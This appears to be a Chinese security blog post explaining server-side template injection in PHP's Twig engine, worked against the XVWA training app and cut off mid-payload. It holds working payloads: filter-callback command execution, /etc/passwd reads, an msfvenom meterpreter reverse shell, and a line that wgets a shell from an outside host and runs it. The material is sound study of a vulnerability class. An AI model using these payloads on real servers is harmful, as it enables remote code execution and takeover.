<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SSTI模版注入学习 - ol4three</title><meta description="模版引擎模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。 模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕"><meta property="og:type" content="blog"><meta property="og:title" content="SSTI模版注入学习"><meta property="og:url" content="http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><meta property="og:site_name" content="ol4three"><meta property="og:description" content="模版引擎模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。 模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125190409616.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191148696.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191252096.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207172609049.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173353137.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173717250.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207180708620.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207181526053.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093133128.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093254678.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094103720.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094226601.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094843016.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095011038.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095233169.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095627806.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095833547.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095933513.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181230660.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181449567.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208183412224.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153255402.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153646329.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209161439230.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173354843.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173408296.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173423416.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173438540.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173614183.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173654529.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174140368.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174219355.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209175837650.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210111913083.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210113238084.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115314686.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115616974.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121343406.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121433075.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121748125.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122230972.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122522307.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122717456.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152321533.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152835575.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155732477.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155853956.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171412511.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171630301.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171935973.png"><meta property="article:published_time" content="2022-01-12T08:36:19.000Z"><meta property="article:modified_time" content="2022-02-22T07:16:10.730Z"><meta property="article:author" content="ol4three"><meta property="article:tag" content="SSTI"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},"headline":"ol4three","image":["https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125190409616.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191148696.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191252096.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207172609049.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173353137.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173717250.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207180708620.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207181526053.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093133128.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093254678.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094103720.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094226601.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094843016.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095011038.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095233169.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095627806.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095833547.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095933513.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181230660.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181449567.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208183412224.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153255402.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153646329.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209161439230.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173354843.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173408296.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173423416.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173438540.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173614183.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173654529.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174140368.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174219355.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209175837650.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210111913083.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210113238084.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115314686.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115616974.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121343406.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121433075.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121748125.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122230972.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122522307.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122717456.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152321533.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152835575.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155732477.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155853956.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171412511.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171630301.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171935973.png"],"datePublished":"2022-01-12T08:36:19.000Z","dateModified":"2022-02-22T07:16:10.730Z","author":{"@type":"Person","name":"ol4three"},"description":"模版引擎模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。 模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕"}</script><link rel="canonical" href="http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><link rel="icon" href="/img/logo.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><script data-ad-client="1" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="ol4three" type="application/atom+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="ol4three" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/Security%20Incidents">Security Incidents</a><a class="navbar-item" href="/Vulnerabilities">Vulnerabilities</a><a class="navbar-item" href="/Read%20Team">Read Team</a><a class="navbar-item" href="/Stop%20learning">Stop learning</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-12T08:36:19.000Z" title="2022-01-12T08:36:19.000Z">2022-01-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-02-22T07:16:10.730Z" title="2022-02-22T07:16:10.730Z">2022-02-22</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-02-22T07:16:10.730Z" title="2022-02-22T07:16:10.730Z">2022-02-22</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">an hour read (About 10271 words)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visits</span></div></div><h1 class="title is-3 is-size-4-mobile">SSTI模版注入学习</h1><div class="content"><h1 id="模版引擎"><a href="#模版引擎" class="headerlink" title="模版引擎"></a>模版引擎</h1><p>模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h1 id="SSTI-模版注入"><a href="#SSTI-模版注入" class="headerlink" title="SSTI(模版注入)"></a>SSTI(模版注入)</h1><p>SSTI就是服务器端模版注入（Server-Side Template Injection）</p>
<p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给Vier视图层，经过模版渲染展示给 用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未进过任何处理就将其作为Web应用模版的一部分，模版引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模版的语句，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模版的地方都可能会出现SSTI的问题，SSTI不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模版引擎发现了很大的安全漏洞，然后模版引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模块引擎。</p>
<h2 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png" alt="image-20220120174838082"></p>
<a id="more"></a>

<h1 id="PHP中的SSTI"><a href="#PHP中的SSTI" class="headerlink" title="PHP中的SSTI"></a>PHP中的SSTI</h1><p>php常见的模版：twig，smarty，blade</p>
<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p>Twig是来自于Symfony的模版引擎，他非常易于安装和使用。它的操作有点像Mustache和liquid</p>
<p>示例代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#39;\twig\lib\Twig\Autoloader.php&#39;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig &#x3D; new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">　　$output &#x3D; $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; &#x3D;&gt; $_GET[&quot;name&quot;]));  &#x2F;&#x2F; 将用户输入作为模版变量的值</span><br><span class="line">　　echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p>
<p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>
<p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p>
<p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125190409616.png" alt="image-20220125190409616"></p>
<p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig&#x3D;newTwig_Environment(newTwig_Loader_String());</span><br><span class="line">　　$output&#x3D;$twig-&gt;render(&quot;Hello &#123;$_GET[&#39;name&#39;]&#125;&quot;);&#x2F;&#x2F; 将用户输入作为模版内容的一部分</span><br><span class="line">　　echo $output;?&gt;</span><br></pre></td></tr></table></figure>

<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191148696.png" alt="image-20220125191148696"></p>
<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p>
<p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>
<p>例如这里用户输入name=20 ，则在服务端拼接的模版内容为:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191252096.png" alt="image-20220125191252096"></p>
<p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>实际服务端要进行编译的模板就被构造为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>由于  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK </p>
<p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207172609049.png" alt="image-20220207172609049"></p>
<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
<p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
<p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p>
<p>接下来借助XVWA的代码来实践演示一下SSTI注入</p>
<p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&#123;$what&#125;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;div&gt;&#123;%$a%&#125;&lt;&#x2F;div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>xvwa源代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;thumbnail&quot;&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">        &lt;img class&#x3D;&quot;img-responsive&quot; src&#x3D;&quot;http:&#x2F;&#x2F;placehold.it&#x2F;800x300&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;caption-full&quot;&gt;</span><br><span class="line">        &lt;h4&gt;&lt;a href&#x3D;&quot;#&quot;&gt;Server Side Template Injection (SSTI)&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p align&#x3D;&quot;justify&quot;&gt;</span><br><span class="line">Web application uses templates to make the web pages look more dynamic. Template Injection occurs when user input is embedded in a template in an unsafe manner. However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise.          &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p&gt;Read more about Server Side Template Injection (SSTI)&lt;br&gt;</span><br><span class="line">        &lt;strong&gt;&lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;http:&#x2F;&#x2F;blog.portswigger.net&#x2F;2015&#x2F;08&#x2F;server-side-template-injection.html&quot;&gt;http:&#x2F;&#x2F;blog.portswigger.net&#x2F;2015&#x2F;08&#x2F;server-side-template-injection.html &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&lt;&#x2F;strong&gt;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;well&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;col-lg-6&quot;&gt; </span><br><span class="line">        &lt;p&gt;</span><br><span class="line">        Hint: &lt;br&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;Template Engine used is TWIG &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;Loader function used &#x3D; &quot;Twig_Loader_String &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;&lt;br&gt;</span><br><span class="line">        &lt;p&gt;Please Enter your Name.  </span><br><span class="line">            &lt;form method&#x3D;&#39;get&#39; action&#x3D;&#39;&#39;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;form-group&quot;&gt; </span><br><span class="line">                    &lt;label&gt;&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;input class&#x3D;&quot;form-control&quot; width&#x3D;&quot;50%&quot; placeholder&#x3D;&quot;Your Name&quot; name&#x3D;&quot;name&quot;&gt;&lt;&#x2F;input&gt; &lt;br&gt;</span><br><span class="line">                    &lt;div align&#x3D;&quot;right&quot;&gt; &lt;button class&#x3D;&quot;btn btn-default&quot; type&#x3D;&quot;submit&quot; name&#x3D;&#39;submit&#39;&gt;Submit Button&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;</span><br><span class="line">               &lt;&#x2F;div&gt; </span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                if (isset($_GET[&#39;submit&#39;])) &#123;</span><br><span class="line">                    $name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">                    &#x2F;&#x2F; include and register Twig auto-loader</span><br><span class="line">                    include &#39;vendor&#x2F;twig&#x2F;twig&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">                    Twig_Autoloader::register();</span><br><span class="line">                    try &#123;</span><br><span class="line">                          &#x2F;&#x2F; specify where to look for templates</span><br><span class="line">                              $loader &#x3D; new Twig_Loader_String();</span><br><span class="line">  </span><br><span class="line">                          &#x2F;&#x2F; initialize Twig environment</span><br><span class="line">                              $twig &#x3D; new Twig_Environment($loader);</span><br><span class="line">                         &#x2F;&#x2F; set template variables</span><br><span class="line">                         &#x2F;&#x2F; render template</span><br><span class="line">                            $result&#x3D; $twig-&gt;render($name);</span><br><span class="line">                            echo &quot;Hello $result&quot;;</span><br><span class="line">  </span><br><span class="line">                    &#125; catch (Exception $e) &#123;</span><br><span class="line">                          die (&#39;ERROR: &#39; . $e-&gt;getMessage());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php include_once(&#39;..&#x2F;..&#x2F;about.html&#39;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173353137.png" alt="image-20220207173353137"></p>
<p>根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于&#123;&#123;&#125;&#125; 的处理方式</p>
<p>在这里提供一个针对twig的攻击载荷：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173717250.png" alt="image-20220207173717250"></p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp -f raw LHOST&#x3D;172.20.10.2 LPORT&#x3D;4321 &gt; &#x2F;var&#x2F;tmp&#x2F;shell.txt</span><br></pre></td></tr></table></figure>

<p>msf进行监听：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207180708620.png" alt="image-20220207180708620"></p>
<p>模板注入远程下载shell，并重命名运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;wget http:&#x2F;&#x2F;172.20.10.2&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php;php -f &#x2F;tmp&#x2F;shell.php&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207181526053.png" alt="image-20220207181526053"></p>
<p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#x2F;etc&#x2F;passwd&#39;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#39;&#x2F;etc&#x2F;passwd&#39;,&#39;&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php 